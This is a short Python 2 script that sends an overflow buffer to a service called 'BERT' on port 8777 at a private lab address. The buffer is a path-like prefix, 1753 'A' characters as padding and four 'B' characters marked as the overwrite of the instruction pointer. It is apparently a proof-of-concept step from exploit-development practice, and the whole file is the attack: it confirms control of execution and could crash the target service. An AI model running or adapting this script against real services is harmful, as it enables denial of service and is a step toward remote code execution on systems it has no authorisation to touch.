#! /usr/bin/python2
import socket;
import sys;

ip="10.0.5.51"
port = 8777 #default BERT port
prefix = 'BERT /.:/'

offset= "A" * 1753
eip = "B" * 4
buffer = prefix + offset + eip

print("Fuzzing BERT with %s bytes " % len(buffer))
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect((ip,port))
s.send((buffer))
s.close()
